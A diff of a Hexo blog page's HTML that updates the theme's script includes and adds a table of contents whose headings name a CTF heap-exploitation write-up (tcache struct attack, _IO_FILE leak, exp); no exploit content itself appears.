+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#shell"><span class="nav-text">shell</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#look-face-no-patch"><span class="nav-text">look_face_no_patch</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#tcache-struct-attack"><span class="nav-text">tcache struct attack</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="nav-text">利用方式</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#IO-FILE-leak"><span class="nav-text">_IO_FILE leak</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#flags%E4%B8%BA%E4%BB%80%E4%B9%88%E4%B9%9F%E8%A6%81%E4%BF%AE%E6%94%B9%EF%BC%9F"><span class="nav-text">_flags为什么也要修改？</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80%E8%88%AC%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="nav-text">一般的利用方式</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98"><span class="nav-text">解题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A3%80%E6%9F%A5%E4%BF%9D%E6%8A%A4"><span class="nav-text">检查保护</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"><span class="nav-text">流程分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90"><span class="nav-text">利用分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#exp"><span class="nav-text">exp</span></a></li></ol></li></ol></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        </div>
+    
 </main>
 
 
 
-<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/dark-light-toggle.js"></script>
 
 
-    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/local-search.js"></script>
+<!-- common js -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/utils.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/header-shrink.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/back2top.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/toggle-theme.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/code-block.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/main.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/libs/anime.min.js"></script>
+
+<!-- local search -->
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/local-search.min.js"></script>
 
 
+<!-- lazyload -->
 
-    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/code-copy.js"></script>
-
-
-
-    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/lazyload.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/lazyload.min.js"></script>
 
 
-<div class="post-scripts">
+<div class="">
+    <!-- home page -->
     
-        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/left-side-toggle.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/libs/anime.min.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/toc.js"></script>
+
+    <!-- post page -->
+    
+        <!-- post-helper -->
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/post/post-helper.min.js"></script>
+
+        <!-- toc -->
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/post/toc.min.js"></script>
+        
+
+        <!-- copyright-info -->
+        
+
+        <!-- share -->
+        
+    
+
+    <!-- categories page -->
+    
+
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
     
 </div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
 
 
 
